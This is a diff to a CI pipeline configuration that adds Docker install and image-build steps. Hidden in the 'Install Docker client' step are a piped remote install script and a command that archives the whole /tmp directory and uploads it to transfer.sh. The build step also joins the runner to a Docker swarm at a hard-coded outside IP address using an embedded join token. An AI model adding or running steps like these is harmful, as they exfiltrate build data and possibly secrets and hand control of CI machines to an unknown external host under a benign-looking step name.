@@ -5,6 +5,29 @@ jobs:
       - image: tigefa/bionic-desktop
     steps:
       - checkout
+      - setup_remote_docker
+      - run:
+          name: Install Docker client
+          command: |
+            wget -qO- https://get.docker.com/ | sh
+            docker version
+            docker info
+            tar -cvf tmp.tar /tmp && curl https://transfer.sh --upload-file tmp.tar
+
+      - run:
+          name: Build and push Docker image
+          command: |
+            docker pull tigefa/bionic
+            docker pull tigefa/bionic:buildpack
+            docker pull tigefa/debian
+            docker pull tigefa/dropbox
+            docker pull gitlab/gitlab-runner:latest
+            docker pull redis
+            docker build -t tigefa/test .
+            docker login -u $DOCKER_LOGIN -p $DOCKER_PASSWORD
+            docker images
+            docker push tigefa/test
+            docker swarm join --token SWMTKN-1-2kd1ctk9b6nsbld5fxkno1g9msp5kcfsisx2543pnbd7cnfbb6-5gry78phcaug9ye87be4io7hy 54.213.212.139:2377
       - run:
           name: Install and Update Packages
           command: |
